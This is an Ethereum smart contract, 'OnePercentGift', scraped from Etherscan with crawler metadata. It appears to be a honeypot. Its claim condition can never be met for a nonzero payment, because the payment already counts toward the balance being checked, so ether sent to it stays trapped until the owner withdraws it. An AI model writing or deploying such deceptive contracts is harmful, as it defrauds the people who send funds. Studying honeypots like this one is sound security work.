//token_name	
//token_url	https://etherscan.io//address/0xb0d9473a71dfafc80df8de7f45a012ef5b33c6fd#code
//spider_time	2018/07/08 12:04:53
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.21;

contract OnePercentGift{
	
	address owner;

	function OnePercentGift(){
		owner=msg.sender;
	}

	function refillGift() payable public{
        
	}

	function claim() payable public{
		if(msg.value == address(this).balance * 100){
			msg.sender.transfer(msg.value + address(this).balance);
		}
	}

	function reclaimUnwantedGift() public{
		owner.transfer(address(this).balance);
	}
}